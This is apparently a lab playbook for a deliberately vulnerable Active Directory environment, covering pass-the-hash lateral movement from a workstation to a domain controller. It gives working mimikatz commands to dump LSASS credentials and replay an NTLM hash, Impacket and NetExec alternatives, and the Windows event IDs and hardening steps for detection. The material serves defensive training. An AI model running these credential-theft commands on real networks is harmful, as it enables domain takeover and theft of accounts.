# Attack 03 — Pass-the-Hash & Lateral Movement (WS01 → domain foothold escalation)

**ATT&CK:** Lateral Movement — Use Alternate Authentication Material: Pass the Hash (T1550.002); Remote Services: SMB/Windows Admin Shares (T1021.002)
**Goal:** Show why the baseline rule "a Domain Admin once logged on to WS01" is fatal: recover reusable credential material from WS01, authenticate *with the hash* (no plaintext needed), and move laterally / execute remotely as the admin.
**Prereqs:** Playbooks 01–02 done; on WS01 a DA session existed earlier (by design, `INTENTIONALLY-VULNERABLE.md` #2). **Lab only, own VMs only.**

---

## Concept (30 seconds)

Windows single sign-on keeps credential material in LSASS memory. If an admin logs on to a workstation an attacker controls, the attacker who gets local code execution + a tool like mimikatz can extract NTLM hashes and **replay the hash itself** as the password-equivalent — the target can't tell the difference. The fix is never "a better hash"; it's *don't expose DA credentials to lower-tier machines* (tiering) + Credential Guard isolating LSASS.

## Steps (standard documented lab flow)

### 1. Get local admin on WS01 and dump credential material (mimikatz, on WS01)

```
# Run mimikatz as local administrator on WS01 (your lab box)
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
# Observe: the a.cedillo-admin logon session and its NTLM hash present on a *workstation*
```

Defender note: this step should already be screaming — Sysmon **Event 10 (ProcessAccess)** on LSASS + AV (Defender ASR "Block credential stealing from LSASS") in a hardened build.

### 2. Pass the Hash to authenticate as the admin (no cracking needed)

```
# Still in mimikatz — spawn a process authenticated with the stolen NTLM hash
mimikatz # sekurlsa::pth /user:a.cedillo-admin /domain:lab.local /ntlm:<NTLM_HASH_FROM_STEP_1> /run:cmd.exe

# From the spawned shell, prove lateral/admin reach, e.g.:
dir \\DC01\C$
```

Alternative tooling with the same TTP: Impacket `psexec.py -hashes :<NTLM> LAB/a.cedillo-admin@192.168.56.10` from KALI, or NetExec `nxc smb 192.168.56.10 -u a.cedillo-admin -H <NTLM>`.

### 3. Validate impact (stop here in the lab)

From the admin context you now effectively hold Domain Admin: you *could* read any file share, create users, or attempt DCSync (attack 04's detection topic). **In this lab, document the access and stop** — the lesson is the movement + the telemetry, not destruction.

## Logs / Event IDs generated (feed `detections/03-pass-the-hash.md`)

| Source | Event | Key fields |
|---|---|---|
| WS01 Sysmon | **10** ProcessAccess | TargetImage `lsass.exe`, GrantedAccess `0x1010`/`0x1410` — LSASS dumping |
| WS01 Security | **4688 / Sysmon 1** | mimikatz execution, suspicious parent/child |
| Target (DC01) Security | **4624 LogonType 9** (NewCredentials) | The classic PtH logon signature from `sekurlsa::pth` |
| Target Security | **4648** (explicit credentials logon) | Logon with explicit credentials to a network target |
| Target Security | **4672** | Special privileges assigned to the new (admin) logon |
| Target Security | **5140/5145** | `C$`/`ADMIN$` share access during lateral execution |

> Analyst insight: PtH rarely appears alone — the high-fidelity story is **LSASS access (Sysmon 10) → Type 9/4648 logon → 4672 admin logon from a workstation**. After hardening (Credential Guard on, tiering enforced, DA never touches WS01), re-run: step 1 should yield no DA material at all.

## Cleanup
Close the pth session, note all timestamps + the hash's *source session* for the findings timeline, snapshot `post-pth`. Do not persist anything.
